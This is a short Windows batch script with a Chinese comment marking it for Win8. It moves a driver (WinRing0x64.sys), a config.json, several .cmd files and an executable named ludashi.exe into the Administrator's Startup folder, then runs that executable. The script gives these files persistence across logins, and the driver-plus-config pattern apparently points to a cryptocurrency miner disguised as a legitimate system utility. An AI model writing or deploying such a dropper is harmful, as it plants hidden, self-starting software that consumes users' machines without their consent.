@echo off
cd 1002 
#适用于Win8系统
MOVE start.cmd C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\『开始』 菜单\程序\启动
MOVE config.json C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\『开始』 菜单\程序\启动
MOVE WinRing0x64.sys C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\『开始』 菜单\程序\启动
MOVE ludashi.exe C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\『开始』 菜单\程序\启动
MOVE 1.cmd C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\『开始』 菜单\程序\启动
MOVE 10.cmd C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\『开始』 菜单\程序\启动
cd 启动
start ludashi.exe